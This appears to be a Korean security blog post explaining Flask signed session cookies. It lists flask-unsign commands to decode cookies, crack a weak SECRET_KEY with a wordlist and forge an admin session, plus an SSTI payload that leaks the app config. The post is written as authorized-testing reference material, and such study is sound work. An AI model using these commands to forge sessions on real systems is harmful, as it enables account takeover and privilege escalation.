---
title: "Flask 비밀키와 세션 쿠키"
date: 2026-10-15 09:00:00 +0900
categories: [Web Security, PHP]
tags: [flask, session, secret-key, web]
description: "Flask 서명 세션 쿠키의 구조와, 하드코딩·약한 SECRET_KEY로 세션을 위조하는 원리, 템플릿 컨텍스트로 설정이 새는 경로의 개념과 구문을 정리합니다."
mermaid: true
---

> Flask의 기본 세션은 서버에 저장되지 않고 **클라이언트 쿠키에 서명되어** 담긴다. `SECRET_KEY`가 약하거나 노출되면 공격자가 세션을 통째로 위조한다.

## 개념

Flask 세션 쿠키는 `base64(payload).base64(timestamp).signature` 형태로, 내용은 **읽을 수 있고**(암호화 아님) `SECRET_KEY`로 HMAC 서명만 돼 있다. 키를 알면 `{"user_id":1,"is_admin":true}` 같은 임의 세션을 만들어 서명할 수 있다. 키는 하드코딩·기본값·약한 문자열·GitHub 유출·SSTI/LFI로 샌다.

```python
app.secret_key = "dev"      # 약한/하드코딩 키 → 세션 위조 가능
session["is_admin"] = True  # 값이 쿠키에 담김(읽기 가능), 서명만 보호
```

## 공격·우회 구문

허가된 범위·테스트 계정에서만.

### 쿠키 디코딩

```
세션 쿠키를 . 로 나눠 첫 조각 Base64 디코딩 → 평문 payload 확인
flask-unsign --decode --cookie '<cookie>'
```

### SECRET_KEY 약한 키 크래킹·위조

```
flask-unsign --unsign --cookie '<cookie>' --wordlist words.txt   # 사전 대입
키 복구 후 위조:
flask-unsign --sign --cookie "{'is_admin': True}" --secret '<key>'
```

### 키 노출 경로 결합

```
SSTI: {{ config['SECRET_KEY'] }} / {{ config.items() }}
LFI·소스 노출로 settings.py 의 SECRET_KEY
GitHub·빌드 산출물·기본값(개발용 'dev','secret','changeme')
```

### 확인 요령

```
세션 쿠키가 서버 저장형인지 클라이언트 서명형인지(디코딩되면 서명형)
키가 기본/약한 값인지 사전 대입(허가된 테스트)
템플릿·오류 페이지로 config 가 새는지
```

## 참고 자료

- [Flask: Sessions and SECRET_KEY](https://flask.palletsprojects.com/en/stable/quickstart/#sessions)
- [CWE-321: Use of Hard-coded Cryptographic Key](https://cwe.mitre.org/data/definitions/321.html)
- [CWE-807: Reliance on Untrusted Inputs in a Security Decision](https://cwe.mitre.org/data/definitions/807.html)
